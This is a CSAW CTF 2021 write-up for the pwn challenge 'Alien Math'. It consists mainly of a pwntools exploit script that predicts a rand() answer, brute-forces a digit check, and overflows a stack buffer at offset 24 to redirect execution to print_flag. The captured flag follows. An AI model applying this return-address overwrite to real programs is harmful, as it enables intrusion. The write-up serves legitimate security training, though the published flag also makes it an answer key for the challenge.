---
name: Alien Math (2021)
event: CSAW CTF 2021
category: Pwn
description: Writeup for Alien Math (pwn) - CSAW CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Alien Math

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/1Dw21NoxXjE/0.jpg)](https://youtu.be/1Dw21NoxXjE?t=3701s "CSAW 2021: Alien Math")

## Challenge Description

> Brush off your Flirbgarple textbooks!

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break second_question_function
continue
'''.format(**locals())

# Binary filename
exe = './alien_math'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# First question - rand() is 0x6b8b4567 everytime..
io.sendlineafter('What is the square root of zopnol?', '1804289383')

# Second question - needs to equal 7759406485255323229225
target = "7759406485255323229225"
user_input = "7"
for i in range(len(target) - 1):
    for j in range(48, 58):
        current_char = ord(target[i])
        next_char = ord(target[i]) + i
        v1 = j - 48
        r = (12 * (next_char - 48) - 4 + 48 * (current_char - 48) - (next_char - 48)) % 10
        if target[i + 1] == chr((v1 + r) % 10 + 48):
            user_input += chr(j)
            break

io.sendlineafter('How many tewgrunbs are in a qorbnorbf?', str(user_input))

# Calculated in GDB with cyclic pattern
offset = 24

# Build the payload
payload = flat({
    offset: [
        elf.symbols.print_flag
    ]
})

# Third question - BoF (offset = 24)
io.sendlineafter('How long does it take for a toblob of energy to be transferred between two quantum entangled salwzoblrs?', payload)

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `flag{w3fL15n1Rx!y0u_r34lLy_4R3@_fL1rBg@rpL3_m4573R!}`
